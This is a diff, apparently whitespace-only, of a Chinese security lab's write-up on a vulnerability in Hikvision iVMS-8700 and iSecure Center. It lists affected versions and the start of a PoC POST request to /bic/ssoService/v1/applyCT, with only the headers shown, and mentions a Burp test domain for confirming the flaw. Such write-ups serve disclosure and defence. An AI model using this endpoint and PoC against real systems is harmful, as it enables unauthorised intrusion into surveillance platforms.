@@ -44,7 +44,7 @@ source: "MrWQ/vulnerability-paper"
 
   
 
-V2.0.0 <= iVMS-8700 <= V2.9.2      V1.0.0 <= iSecure Center <= V1.7.0
+V2.0.0 <= iVMS-8700 <= V2.9.2      V1.0.0 <= iSecure Center <= V1.7.0
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
 
@@ -60,12 +60,12 @@ V2.0.0 <= iVMS-8700 <= V2.9.2      V1.0.0 <= iSecure Center <= V1.7.0
 
 2. 对漏洞进行复现
 
- **Poc （POST）**
+ **Poc （POST）**
 
 ```
-POST /bic/ssoService/v1/applyCT HTTP/1.1
+POST /bic/ssoService/v1/applyCT HTTP/1.1
 Host: 127.0.0.1
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
@@ -84,7 +84,7 @@ POST 请求，响应存在漏洞
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBnHyLw2NRtyfdglib2BRw4mHibib9fVVXI5GRvibEsx1XnlACPzhB4AmVZWu5chO58vUz5ib1Zo0gbMQw/640?wx_fmt=png)
 
-        burp 生成测试域名
+        burp 生成测试域名
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBnHyLw2NRtyfdglib2BRw4mIr0TIuzXkZBr1LX9DgwoEGTVT4ibET2tzJtkiauyCwPKM762S5O7jRjw/640?wx_fmt=png)
 
@@ -113,7 +113,7 @@ https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-no
 
 口号 网安引领时代，弥天点亮未来
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
+![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
 
 知识分享完了
 
@@ -125,7 +125,7 @@ https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-no
 
 必降弥天之润！
 
-   弥  天
+   弥  天
 
 安全实验室  
 
